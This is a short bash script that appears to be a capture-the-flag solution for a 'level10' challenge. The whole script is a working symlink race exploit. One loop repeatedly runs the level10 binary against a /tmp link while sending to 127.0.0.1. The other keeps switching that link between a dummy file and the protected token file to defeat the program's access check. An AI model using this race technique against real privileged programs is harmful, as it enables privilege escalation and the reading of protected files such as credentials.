#!/bin/bash

random_file="file_${RANDOM}_${RANDOM}"

touch /tmp/$random_file

link_name="file_${RANDOM}_${RANDOM}"

# The script runs the level10 binary in an infinite loop, redirecting its output to /dev/null.
while true
do
        /home/user/level10/level10 /tmp/$link_name 127.0.0.1 &> /dev/null
done &

# alterns the link to the random file and the token file in an infinite loop.
while true
do
        ln -fs /home/user/level10/token /tmp/$link_name
        ln -fs /tmp/$random_file /tmp/$link_name
done
